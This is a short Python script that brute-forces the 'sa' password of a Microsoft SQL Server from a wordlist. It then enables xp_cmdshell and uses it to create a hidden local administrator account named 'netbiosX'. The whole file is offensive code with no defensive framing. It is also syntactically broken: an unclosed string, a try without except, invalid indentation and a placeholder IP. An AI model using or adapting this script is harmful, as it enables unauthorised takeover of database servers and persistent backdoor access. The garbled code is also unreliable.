import _mssql

#mssql =_mssql.connect('ip','username','password')
#mssql.execute_query 


passwords= file("password.txt", "r")
ip="192.ecc"

for password in passwords:
    password=password.rstrip()
    try:
         mssql=_mssql.connect(ip,"sa",password)
mssql.execute_query("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE;")
mssql.execute_query("RECONFIGURE;")

mssql.execute_query("xp_cmdshell 'net user netbiosX Password! /ADD && net localgroup administrators netbiosX /ADD")
mssql.close()

break